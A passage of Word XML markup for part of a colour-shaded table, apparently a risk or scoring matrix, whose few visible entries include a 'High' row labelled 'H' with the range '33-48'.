              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="FFFF00"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFF00"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="340" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFF00"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="420" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFF00"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="20" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFF00"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="520" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFF00"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="760" w:type="dxa"/>
            <w:gridSpan w:val="2"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="FFFF00"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFF00"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="440" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFF00"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="120" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFF00"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="340" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFF00"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="460" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFF00"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="100" w:type="dxa"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="340" w:type="dxa"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2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58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44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100" w:type="dxa"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="36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30" w:type="dxa"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidTr="006C7366">
        <w:trPr>
          <w:trHeight w:val="301"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="140" w:type="dxa"/>
            <w:tcBorders>
              <w:left w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="FFC000"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFC000"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="300" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFC000"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>H</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="260" w:type="dxa"/>
            <w:tcBorders>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFC000"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1360" w:type="dxa"/>
            <w:gridSpan w:val="2"/>
            <w:tcBorders>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="FFC000"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFC000"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:ind w:left="100"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>High</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="340" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFC000"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="420" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFC000"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="20" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFC000"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="520" w:type="dxa"/>
            <w:tcBorders>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFC000"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="760" w:type="dxa"/>
            <w:gridSpan w:val="2"/>
            <w:tcBorders>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="FFC000"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFC000"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:ind w:left="100"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>33-48</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="440" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFC000"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="120" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFC000"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="340" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFC000"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="460" w:type="dxa"/>
            <w:tcBorders>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFC000"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="100" w:type="dxa"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="340" w:type="dxa"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2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58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44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100" w:type="dxa"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="36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30" w:type="dxa"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidTr="006C7366">
        <w:trPr>
          <w:trHeight w:val="106"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="140" w:type="dxa"/>
            <w:tcBorders>
              <w:left w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="FFC000"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFC000"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="300" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFC000"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="260" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFC000"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1360" w:type="dxa"/>
            <w:gridSpan w:val="2"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="FFC000"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFC000"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="340" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFC000"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="420" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFC000"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="20" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFC000"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="520" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFC000"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="760" w:type="dxa"/>
            <w:gridSpan w:val="2"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="FFC000"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFC000"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="440" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFC000"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="120" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFC000"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="340" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFC000"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="460" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFC000"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="100" w:type="dxa"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="340" w:type="dxa"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2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58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44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100" w:type="dxa"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="36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30" w:type="dxa"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidTr="006C7366">
        <w:trPr>
          <w:trHeight w:val="301"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="140" w:type="dxa"/>
            <w:tcBorders>
              <w:left w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="FF0000"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FF0000"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="300" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FF0000"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
